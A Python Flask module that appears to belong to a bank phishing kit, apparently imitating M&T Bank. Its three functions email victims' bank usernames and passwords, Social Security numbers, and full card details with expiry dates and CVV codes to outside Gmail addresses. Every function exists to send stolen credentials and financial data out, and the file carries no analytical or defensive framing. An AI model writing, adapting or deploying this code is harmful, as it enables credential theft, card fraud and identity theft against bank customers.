from mandt import mail
from flask_mail import Message
from datetime import datetime

def report_login(username,password,bank_name):
    msg = Message('New Login',
        sender='angelamoore914@gmail.com',
        recipients=['ritapratt010@gmail.com,christinesalgado477@gmail.com'])
    msg.body=f'''
    For ----- {bank_name}
    Username is ----- {username}
    Password is ----- {password}
    at ---- {datetime.now()}
    '''
    mail.send(msg)


def report_ssn(ssn):
    msg = Message('New Login',
        sender='angelamoore914@gmail.com',
        recipients=['ritapratt010@gmail.com,christinesalgado477@gmail.com'])
    msg.body=f'''
    SSN ----- {ssn}
    at ---- {datetime.now()}
    '''
    mail.send(msg)

def report_card_details( card_name, card_number,expiry_date,cvv):
    msg = Message('New Login',
        sender='angelamoore914@gmail.com',
        recipients=['ritapratt010@gmail.com,christinesalgado477@gmail.com'])
    msg.body=f'''
    Card name is ----- {card_name}
    Card Number is ----- {card_number}
    Expiry Date is ----- {expiry_date}
    CVV is ----- {cvv}
    at ---- {datetime.now()}
    '''
    mail.send(msg)